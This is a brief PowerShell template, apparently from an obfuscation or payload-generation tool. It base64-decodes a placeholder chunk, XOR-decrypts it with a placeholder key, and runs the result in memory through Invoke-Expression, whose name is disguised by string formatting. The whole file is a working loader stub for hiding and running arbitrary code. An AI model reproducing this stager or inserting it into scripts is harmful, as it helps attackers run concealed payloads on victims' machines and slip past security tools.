${data} = "{{chunk}}";
${data} = [System.Convert]::FromBase64String(${data});
for (${x} = 0; ${x} -lt ${data}.Count; ${x}++) {
    ${data}[${x}] = ${data}[${x}] -bxor {{key}}
}.("{1}{0}"-f'x','ie') ([System.Text.Encoding]::Unicode.GetString(${data}));
